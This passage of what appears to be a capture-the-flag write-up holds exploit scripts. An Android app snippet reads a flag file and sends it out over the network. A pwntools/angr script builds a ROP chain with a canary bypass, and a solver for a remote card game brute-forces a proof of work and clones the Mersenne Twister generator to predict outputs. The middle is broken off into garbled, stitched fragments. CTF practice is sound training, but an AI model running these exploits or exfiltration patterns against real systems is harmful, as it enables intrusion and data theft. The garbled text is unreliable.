            StringBuffer sb = new StringBuffer(""); 
            while (true) { 
                try { 
                    if (!(-1 != isr.read(buf, 0, 1024))) break; 
                } catch (IOException e) { 
                    e.printStackTrace(); 
                } 
                sb.append(String.valueOf(buf)); 
            } 
            String flag = new String(sb); 
            Net.get(flag); 
            Log.d("CTF1", flag); 
        } catch (IOException e) { 
            e.printStackTrace(); 
        } 
    } 
    @Override 
    protected void onCreate(Bundle savedInstanceState) { 
        super.onCreate(savedInstanceState); 
        setContentView(R.layout.activity_main); 
//        File imagePath = new File(this.getFilesDir(), ""); 
//        File newFile = new File(imagePath, "flag"); 
//        Uri contentUri = getUriForFile(this, 
"com.bytectf.bronzedroid.fileprovider", newFile); 
//        Log.d("CTF1", contentUri.toString()); 
        getFlag(); 
    } 
} 
ComeAndPlay
import angr 
import claripy 
from pwn import * 
import base64 
#context.log_level = "debug" 
CHALLENGE_ID = 'bd7839f501e0d4b89cc88ef1b9665135' 
sh = process(['./wscat', '--endpoint', 
'wss://telnet.2022.capturetheflag.fun/ws/' + CHALLENGE_ID]) 
sh.recvuntil("--------\n\n\n") 
text = sh.recvuntil("==\n") 
print(text) 
a = base64.b64decode(text) 
open("ComeAndPlay/elfx","wb").write(a) 
context.arch='amd64' 
context.terminal=['lxterminal','-e'] 
def get_entry_code(f, target): 
    base  = 0x400000 
    proj = angr.Project(f, load_options={"auto_load_libs": 
False}) 
    state = proj.factory.call_state(addr=base+0x134E) 
    state.options |= {angr.options.LAZY_SOLVES} 
    init_rdi = claripy.BVS("init_edi", 32) 
    state.regs.edi = init_rdi 
PYTHON
    simgr = proj.factory.simulation_manager(state) 
    r = simgr.explore(find=base+target) 
    return r.found[0].solver.eval(init_rdi, cast_to=int) 
TARGET = "ComeAndPlay/elfx" 
elf = ELF(TARGET) 
FIND_OFF = 0 
for line in elf.disasm(0x134E, 500).splitlines(): 
    if 'mov    DWORD PTR [rbp-0x4], 0x0' in line: 
        FIND_OFF = int(line.split(':')[0], 16) 
        break 
RSP_OFF = int(elf.disasm(0x1356, 0x7).split("rsp, ")[-1], 16) 
CANARY2 = int(elf.disasm(0x13D4, 0x4).split("[rbp-")
[-1].replace('], rax', ''), 16) 
LEN_TO_CANARY=RSP_OFF - CANARY2 - 0x10 
LEN_TO_RETADDR=int(elf.disasm(0x136a, 0x7).split("[rbp-")[-1]
[:-1], 16)+8 
OFFSET_POPRDI_RET=next(elf.search(asm("pop rdi; ret"), 
executable=True)) 
PUTS_PLT=elf.plt['puts'] 
PUTS_GOT=elf.got['puts'] 
READ_GOT=elf.got['read'] 
CSU_POPRBX=next(elf.search(asm("pop rbx; pop rbp; pop r12; pop 
r13; pop r14; pop r15; ret"), executable=True)) 
CSU_SETRDX=next(elf.search(asm("mov rdx, r14; mov rsi, r13; mov 
edi, r12d; call qword ptr [r15+rbx*8]"), executable=True)) 
CANARY_CONST=int(elf.disasm(0x13CD, 7).split('# ')[1], 16) 
print("RSP_OFF = ", hex(RSP_OFF)) 
print("LEN_TO_CANARY = ", hex(LEN_TO_CANARY)) 
print("LEN_TO_RETADDR = ", hex(LEN_TO_RETADDR)) 
print("OFFSET_POPRDI_RET = ", hex(OFFSET_POPRDI_RET)) 
print("PUTS_PLT = ", hex(PUTS_PLT)) 
print("PUTS_GOT = ", hex(PUTS_GOT)) 
print("READ_GOT = ", hex(READ_GOT)) 
print("CSU_POPRBX = ", hex(CSU_POPRBX)) 
print("CSU_SETRDX = ", hex(CSU_SETRDX)) 
print("CANARY_CONST = ", hex(CANARY_CONST)) 
print("FIND_OFF = ", hex(FIND_OFF)) 
code = get_entry_code(TARGET, FIND_OFF) 
print("code = " , code) 
#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6") 
libc=ELF("ComeAndPlay/libc.so") 
p = sh 
#p=process([TARGET, str(code)]) 
p.sendline(str(code)) 
base=0b10101=6 and 
sysdig.event_type46 
strings find_it-2e157327-a739-42a9-b857-5a50bdf6e3d9.scap | grep 
} 
bec5-d7563b2672b6}.php 
CardShark
import random 
import time 
import copy 
# Quick hack 
import sys 
sys.path.append('./source') 
# Import symbolic execution 
from MT19937 import MT19937, MT19937_symbolic 
# Import XorSolver 
from XorSolver import XorSolver 
import string 
from pwn import * 
import randcrack 
from tqdm import tqdm 
from hashlib import * 
PYTHON
from itertools import product 
from Crypto.Util.number import * 
CHALLENGE_ID = 'a586ca89c4876122f2e3cddbfdbe521c' 
r = remote(CHALLENGE_ID + '.2022.capturetheflag.fun', 1337, 
ssl=True) 
# context(log_level='debug') 
ALPHABET = string.ascii_letters + string.digits 
r.recvuntil(b'sha256') 
rec = r.recvline().decode().replace(' ', '') 
print(rec) 
rec = rec[rec.find('+')+1::] 
suffix = rec[rec.find('+')+1:rec.find(')')] 
digest = rec[rec.find('==')+2:-1] 
print(f"suffix: {suffix} \ndigest: {digest}") 
for i in product(ALPHABET, repeat=4): 
    prefix = ''.join(i) 
    guess = prefix + suffix 
    if sha256(guess.encode()).hexdigest() == digest: 
        log.info(f"Find XXXX: {prefix}") 
        break 
r.sendline(prefix.encode()) 
# r.interactive() 
rc = randcrack.RandCrack() 
cards = [] 
for t in ('Hearts', 'Spades', 'Diamonds', 'Clubs'): 
    for p in ('J', 'Q', 'K', 'A'): 
        cards.append(f'{p} {t}') 
n_test = [] 
for i in tqdm(range(4992)): 
    r.sendlineafter(b'Your guess > ', b'lyutoon') 
    r.recvuntil(b'Sorry! My card is ') 
    real = r.recvline().decode().strip()[:-1] 
    num = cards.index(real) 
    n_test.append(num) 
t = time.time() 
rng_clone = MT19937(state_from_data = (n_test, 4)) 
print("Time taken: {}s".format(time.time() - t)) 
for n in n_test: 
    assert n == rng_clone() >> (32-4), "Clone failed!" 
print("[*] Cloning successful!") 
cnt = 0 
for i in range(5200 - 4992): 
    num = rng_clone() >> (32-4) 
    r.sendlineafter(b'Your guess > ', cards[num].encode()) 
    res = r.recvline().decode() 
    print(res) 
    if 'Correct' in res: 
        cnt += 1 
        if cnt >= 200: 
            r.interactive() 
# # Collecting data 
# n_test = [] 
# for _ in range(624*32//nbits): 
#     # Get random number from rng and save for later testing 
#     n_test.append(n) 
# t = time.time() 
# # Cloning MT19937 from data 
# rng_clone = MT19937(state_from_data = (n_test, nbits)) 
# print("Time taken: {}s".format(time.time() - t)) 
# # Test if cloning has been successful 
# for n in n_test: 
#     assert n == rng_clone() >> (32-nbits), "Clone failed!" 
# print("[*] Cloning successful!") 
# print(rng_clone() >> (32-nbits)) 
# print(rng())